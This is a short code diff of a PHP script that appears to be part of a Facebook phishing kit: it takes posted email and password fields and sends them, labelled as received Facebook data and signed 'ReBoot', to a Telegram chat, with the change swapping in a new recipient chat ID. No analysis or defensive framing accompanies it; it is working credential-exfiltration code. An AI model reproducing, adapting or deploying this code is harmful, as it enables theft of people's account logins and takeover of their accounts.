@@ -11,7 +11,7 @@ $dot = $_POST['para'];
 $dat = $_POST['poro'];
 
 $datos = [
-    'chat_id' => '1189170037',
+    'chat_id' => '5478715585',
     #'chat_id' => '@el_canal si va dirigido a un canal',
     'text' => "DATOS RECIBIDOS F-A-C-E-B-O-O-K \n\n🪙 Email $dot \n✅ Password: $dat  \n\nATTE: ReBoot",
     'parse_mode' => 'HTML' #formato del mensaje
